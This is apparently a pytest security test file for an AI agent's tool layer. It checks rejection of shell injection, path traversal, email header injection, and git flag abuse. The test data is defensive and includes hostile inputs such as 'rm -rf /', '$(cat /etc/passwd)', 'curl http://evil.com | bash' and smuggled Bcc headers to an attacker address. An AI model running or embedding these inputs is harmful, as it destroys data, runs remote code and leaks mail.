"""Sprint 1 Security Tests — command injection, path traversal, safety analysis.

Tests every security fix from Sprint 1:
  - C-01/C-02/C-03: Command injection prevention via safe_subprocess
  - H-11/H-12: Enhanced safety analysis (shlex, git flags, absolute paths)
  - H-13: Exact node matching
  - H-16/H-17/H-18: Path traversal prevention
  - H-26: Email header injection
  - H-14: Agent recursion prevention
"""

from __future__ import annotations

import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

# ── safe_subprocess tests ──


class TestSplitCommand:
    """Test split_command() rejects injection vectors."""

    def setup_method(self):
        from anima.tools.safe_subprocess import split_command
        self.split = split_command

    def test_normal_command(self):
        result = self.split("gh", "pr list --repo owner/repo")
        assert result == ["gh", "pr", "list", "--repo", "owner/repo"]

    def test_empty_args(self):
        result = self.split("gh", "")
        assert result == ["gh"]

    def test_quoted_args(self):
        result = self.split("gh", "issue create --title 'My Issue'")
        assert result == ["gh", "issue", "create", "--title", "My Issue"]

    @pytest.mark.parametrize("payload", [
        "pr list && rm -rf /",
        "pr list; echo hacked",
        "pr list | cat /etc/passwd",
        "pr list `whoami`",
        "pr list $(whoami)",
        "pr list ${HOME}",
        "pr list\nrm -rf /",
        "pr list\rrm -rf /",
        "pr list || true",
    ])
    def test_rejects_shell_metacharacters(self, payload):
        from anima.utils.errors import CommandRejected
        with pytest.raises((CommandRejected, ValueError)):
            self.split("gh", payload)

    def test_rejects_backtick_in_quoted_string(self):
        from anima.utils.errors import CommandRejected
        # Even inside quotes, backticks should be rejected
        with pytest.raises(CommandRejected):
            self.split("gh", "issue create --title '`whoami`'")

    def test_rejects_dollar_paren_in_quoted_string(self):
        from anima.utils.errors import CommandRejected
        with pytest.raises(CommandRejected):
            self.split("gh", "issue create --body '$(cat /etc/passwd)'")


class TestRunSafe:
    """Test run_safe() enforces tool-level policies."""

    @pytest.mark.asyncio
    async def test_never_shell_tool_rejects_string(self):
        from anima.tools.safe_subprocess import run_safe
        from anima.utils.errors import CommandRejected
        with pytest.raises(CommandRejected, match="must use list-form"):
            await run_safe("gh pr list", tool_name="github")

    @pytest.mark.asyncio
    async def test_list_command_works(self):
        from anima.tools.safe_subprocess import run_safe
        # Simple command that should work on any system
        result = await run_safe(
            ["python", "-c", "print('hello')"],
            tool_name="shell",
        )
        assert result["returncode"] == 0
        assert "hello" in result["stdout"]

    @pytest.mark.asyncio
    async def test_timeout_works(self):
        from anima.tools.safe_subprocess import run_safe
        result = await run_safe(
            ["python", "-c", "import time; time.sleep(10)"],
            tool_name="shell",
            timeout=1,
        )
        assert result["returncode"] == -1
        assert "timeout" in result.get("error", "").lower()

    @pytest.mark.asyncio
    async def test_safety_check_blocks_dangerous(self):
        from anima.tools.safe_subprocess import run_safe
        from anima.utils.errors import CommandRejected
        with pytest.raises(CommandRejected):
            await run_safe("rm -rf /", tool_name="shell")


# ── Safety analysis tests ──


class TestSafetyV2:
    """Test enhanced safety analysis with shlex parsing."""

    def setup_method(self):
        from anima.tools.safety import assess_command_risk, _assess_segment, _extract_executable
        self.assess = assess_command_risk
        self.assess_segment = _assess_segment
        self.extract_exe = _extract_executable

    def test_extract_executable_unix(self):
        assert self.extract_exe("/usr/bin/rm") == "rm"
        assert self.extract_exe("/bin/bash") == "bash"

    def test_extract_executable_windows(self):
        assert self.extract_exe("C:\\Windows\\system32\\cmd.exe") == "cmd"
        assert self.extract_exe("D:\\Program Files\\git\\bin\\git.exe") == "git"

    def test_extract_executable_plain(self):
        assert self.extract_exe("ls") == "ls"
        assert self.extract_exe("git") == "git"

    def test_absolute_path_rm_blocked(self):
        from anima.models.tool_spec import RiskLevel
        risk = self.assess("/usr/bin/rm -rf /home/user")
        assert risk >= RiskLevel.HIGH

    def test_git_safe_subcmd(self):
        from anima.models.tool_spec import RiskLevel
        assert self.assess("git status") == RiskLevel.SAFE
        assert self.assess("git log --oneline") == RiskLevel.SAFE
        assert self.assess("git diff HEAD") == RiskLevel.SAFE

    def test_git_dangerous_flags(self):
        from anima.models.tool_spec import RiskLevel
        assert self.assess("git fetch --exec=evil") == RiskLevel.HIGH
        assert self.assess("git config core.pager=/bin/sh") == RiskLevel.HIGH
        assert self.assess("git config alias.x='!rm -rf /'") >= RiskLevel.HIGH

    def test_git_push_medium(self):
        from anima.models.tool_spec import RiskLevel
        assert self.assess("git push origin main") == RiskLevel.MEDIUM

    def test_pipe_injection(self):
        from anima.models.tool_spec import RiskLevel
        risk = self.assess("curl http://evil.com | bash")
        assert risk >= RiskLevel.HIGH


# ── Path safety tests ──


class TestPathSafety:
    """Test path traversal prevention."""

    def test_normal_path(self, tmp_path):
        from anima.utils.path_safety import validate_path_within
        child = tmp_path / "subdir" / "file.txt"
        child.parent.mkdir(parents=True, exist_ok=True)
        child.touch()
        result = validate_path_within(child, tmp_path)
        assert result == child.resolve()

    def test_traversal_blocked(self, tmp_path):
        from anima.utils.path_safety import validate_path_within
        from anima.utils.errors import PathTraversalBlocked
        evil_path = tmp_path / ".." / ".." / ".." / "etc" / "passwd"
        with pytest.raises(PathTraversalBlocked):
            validate_path_within(evil_path, tmp_path)

    def test_relative_traversal_blocked(self, tmp_path):
        from anima.utils.path_safety import validate_path_within
        from anima.utils.errors import PathTraversalBlocked
        evil_path = tmp_path / "subdir" / ".." / ".." / ".." / "etc" / "passwd"
        with pytest.raises(PathTraversalBlocked):
            validate_path_within(evil_path, tmp_path)

    def test_exact_root_is_allowed(self, tmp_path):
        from anima.utils.path_safety import validate_path_within
        result = validate_path_within(tmp_path, tmp_path)
        assert result == tmp_path.resolve()

    def test_is_safe_path_helper(self, tmp_path):
        from anima.utils.path_safety import is_safe_path
        safe = tmp_path / "file.txt"
        unsafe = tmp_path / ".." / ".." / "etc" / "passwd"
        assert is_safe_path(safe, tmp_path) is True
        assert is_safe_path(unsafe, tmp_path) is False


# ── Memory decay data integrity tests ──


class TestDecayIntegrity:
    """Test that decay preserves original importance."""

    @pytest.mark.asyncio
    async def test_original_importance_preserved(self):
        """C-05: update_all_scores must NOT overwrite importance column."""
        from anima.memory.decay import MemoryDecay
        from unittest.mock import AsyncMock
        import time

        decay = MemoryDecay()
        mock_store = MagicMock()

        # Simulate a memory row with importance=0.9
        mock_row = {
            "id": "mem_test_1",
            "type": "chat",
            "importance": 0.9,
            "created_at": time.time() - 7200,  # 2 hours ago
            "access_count": 0,
            "decay_score": None,
            "metadata_json": "{}",
        }

        # Mock the DatabaseManager interface (D-02 migrated from _conn to _db)
        mock_db = MagicMock()
        mock_db.fetch = AsyncMock(return_value=[mock_row])
        mock_db.execute_many = AsyncMock(return_value=1)
        mock_store._db = mock_db

        await decay.update_all_scores(mock_store)

        # Verify: the UPDATE should target decay_score, NOT importance
        if mock_db.execute_many.called:
            sql = mock_db.execute_many.call_args[0][0]
            assert "decay_score" in sql, f"Expected 'decay_score' in UPDATE, got: {sql}"
            assert "SET importance" not in sql, f"Must NOT update importance column: {sql}"


# ── Email header injection tests ──


class TestEmailSafety:
    """Test email header injection prevention (H-26)."""

    def test_rejects_newline_in_address(self):
        from anima.tools.builtin.email_tool import _send_sync
        # Patch _load_config to provide minimal config
        with patch("anima.tools.builtin.email_tool._load_config"):
            with patch("anima.tools.builtin.email_tool._EMAIL_CONFIG", {
                "account": "test@test.com", "password": "xxx",
                "smtp_host": "localhost", "smtp_port": 587, "contacts": {},
            }):
                result = _send_sync(
                    to="admin@example.com\nbcc:attacker@evil.com",
                    subject="Test",
                    body="Test body",
                )
                assert result.get("success") is False
                assert "Invalid" in result.get("error", "")

    def test_rejects_carriage_return_in_subject(self):
        from anima.tools.builtin.email_tool import _send_sync
        with patch("anima.tools.builtin.email_tool._load_config"):
            with patch("anima.tools.builtin.email_tool._EMAIL_CONFIG", {
                "account": "test@test.com", "password": "xxx",
                "smtp_host": "localhost", "smtp_port": 587, "contacts": {},
            }):
                result = _send_sync(
                    to="admin@example.com",
                    subject="Test\rBcc: attacker@evil.com",
                    body="Test body",
                )
                assert result.get("success") is False


# ── Error hierarchy tests ──


class TestErrorHierarchy:
    """Test the unified exception hierarchy."""

    def test_all_errors_inherit_from_anima_error(self):
        from anima.utils.errors import (
            AnimaError, CommandRejected, PathTraversalBlocked,
            ToolExecutionError, LLMCallError, MemoryCorruptionError,
            EvolutionError, ConfigurationError, ContextTooSmallError,
        )
        for cls in [CommandRejected, PathTraversalBlocked, ToolExecutionError,
                     LLMCallError, MemoryCorruptionError, EvolutionError,
                     ConfigurationError, ContextTooSmallError]:
            assert issubclass(cls, AnimaError)

    def test_llm_error_retryable(self):
        from anima.utils.errors import LLMCallError
        err_429 = LLMCallError("opus", "rate limited", status_code=429)
        assert err_429.retryable is True
        err_400 = LLMCallError("opus", "bad request", status_code=400)
        assert err_400.retryable is False

    def test_tool_error_attributes(self):
        from anima.utils.errors import ToolExecutionError
        err = ToolExecutionError("shell", "timeout", retryable=True)
        assert err.tool_name == "shell"
        assert err.retryable is True
        assert "shell" in str(err)

    def test_path_traversal_attributes(self):
        from anima.utils.errors import PathTraversalBlocked
        err = PathTraversalBlocked("../../etc/passwd", "/home/user")
        assert err.path == "../../etc/passwd"
        assert err.allowed_root == "/home/user"


# ── Database manager tests ──


class TestPgDatabaseManager:
    """The Postgres data layer: one connection + one lock (psycopg conns aren't
    thread-safe), autocommit, and Neon→local failover."""

    def test_ipv4_localhost_normalization(self):
        """'localhost' is pinned to 127.0.0.1 (Windows IPv6 ::1 stalls connect)."""
        from anima.memory.pg_db import PgDatabaseManager
        n = PgDatabaseManager._ipv4_localhost
        assert n("postgresql://u:p@localhost:5432/db") == "postgresql://u:p@127.0.0.1:5432/db"
        assert n("postgresql://u:p@localhost/db") == "postgresql://u:p@127.0.0.1/db"
        assert n("postgresql://u:p@db.neon.tech/db") == "postgresql://u:p@db.neon.tech/db"
        assert n("") == ""

    @pytest.mark.asyncio
    async def test_write_and_read(self):
        from anima.memory.pg_db import PgDatabaseManager
        from pgutil import ensure_test_db, test_dsn
        if not test_dsn() or not ensure_test_db():
            pytest.skip("local Postgres unavailable")

        db = PgDatabaseManager(dsn=test_dsn())
        await db.init("CREATE TABLE IF NOT EXISTS _dbmgr_test (id TEXT PRIMARY KEY, value TEXT)")
        try:
            db.write_sync("TRUNCATE _dbmgr_test")
            db.write_sync("INSERT INTO _dbmgr_test VALUES (%s, %s)", ("k1", "v1"))
            rows = db.fetch_sync("SELECT * FROM _dbmgr_test WHERE id = %s", ("k1",))
            assert len(rows) == 1
            assert rows[0]["value"] == "v1"
        finally:
            db.write_sync("DROP TABLE IF EXISTS _dbmgr_test")
            await db.close()
        assert not db.is_open

    @pytest.mark.asyncio
    async def test_write_many_batch(self):
        from anima.memory.pg_db import PgDatabaseManager
        from pgutil import ensure_test_db, test_dsn
        if not test_dsn() or not ensure_test_db():
            pytest.skip("local Postgres unavailable")

        db = PgDatabaseManager(dsn=test_dsn())
        await db.init("CREATE TABLE IF NOT EXISTS _dbmgr_batch (id TEXT, value REAL)")
        try:
            db.write_sync("TRUNCATE _dbmgr_batch")
            params = [(f"k{i}", float(i) * 0.1) for i in range(100)]
            db.write_many_sync("INSERT INTO _dbmgr_batch VALUES (%s, %s)", params)
            rows = db.fetch_sync("SELECT COUNT(*) AS cnt FROM _dbmgr_batch")
            assert rows[0]["cnt"] == 100
        finally:
            db.write_sync("DROP TABLE IF EXISTS _dbmgr_batch")
            await db.close()

    @pytest.mark.asyncio
    async def test_runtime_reconnect_after_dropped_connection(self):
        """A connection that drops mid-operation reconnects + retries (the app
        survives a Neon blip instead of crashing)."""
        from anima.memory.pg_db import PgDatabaseManager
        from pgutil import ensure_test_db, test_dsn
        if not test_dsn() or not ensure_test_db():
            pytest.skip("local Postgres unavailable")

        db = PgDatabaseManager(dsn=test_dsn())
        await db.init("")
        try:
            # Simulate the server dropping us: close the underlying socket.
            db._conn.close()
            # The next read must reconnect + succeed, not raise.
            rows = db.fetch_sync("SELECT 1 AS one")
            assert rows[0]["one"] == 1
            # The write path routes through the same retry — drop again, write.
            db._conn.close()
            db.write_sync("CREATE TEMP TABLE _rc_test (x int)")
            db.write_sync("INSERT INTO _rc_test VALUES (1)")
            assert db.fetch_sync("SELECT COUNT(*) AS n FROM _rc_test")[0]["n"] == 1
        finally:
            await db.close()

    @pytest.mark.asyncio
    async def test_failover_to_local_when_primary_down(self):
        """A dead primary falls back to the local endpoint (offline failover)."""
        from anima.memory.pg_db import PgDatabaseManager
        from pgutil import ensure_test_db, test_dsn
        if not test_dsn() or not ensure_test_db():
            pytest.skip("local Postgres unavailable")

        # Primary points at a refused port → fails fast → local takes over.
        db = PgDatabaseManager(
            dsn="postgresql://postgres:x@127.0.0.1:1/anima_test",
            local_dsn=test_dsn(),
        )
        await db.init("")
        try:
            assert db.using_local is True
            assert db.fetch_sync("SELECT 1 AS one")[0]["one"] == 1
        finally:
            await db.close()
